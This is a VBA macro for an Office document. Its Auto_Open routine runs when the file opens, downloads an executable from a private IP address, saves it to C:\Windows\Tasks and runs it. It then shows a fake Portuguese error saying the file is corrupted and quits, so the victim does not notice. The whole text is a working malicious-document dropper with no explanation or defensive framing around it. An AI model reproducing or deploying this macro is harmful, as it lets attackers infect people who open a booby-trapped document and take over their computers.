Sub Auto_Open()
Dim http_obj
Dim stream_obj
Dim shell_obj
Set http_obj = CreateObject("Microsoft.XMLHTTP")
Set stream_obj = CreateObject("ADODB.Stream")
Set shell_obj = CreateObject("WScript.Shell")
URL = "http://192.168.243.217/NoProblem.exe"
Filename = "C:\Windows\Tasks\NoProblem.exe"
RUNCMD = "C:\Windows\Tasks\NoProblem.exe"
http_obj.Open "GET", URL, False
http_obj.send
stream_obj.Type = 1
stream_obj.Open
stream_obj.write http_obj.responseBody
stream_obj.savetofile Filename, 2
shell_obj.Run RUNCMD
msg = "O arquivo está corrompido e não pode ser aberto." 
intResponse = MsgBox(msg, 16, Title) 
Application.Quit 
End Sub
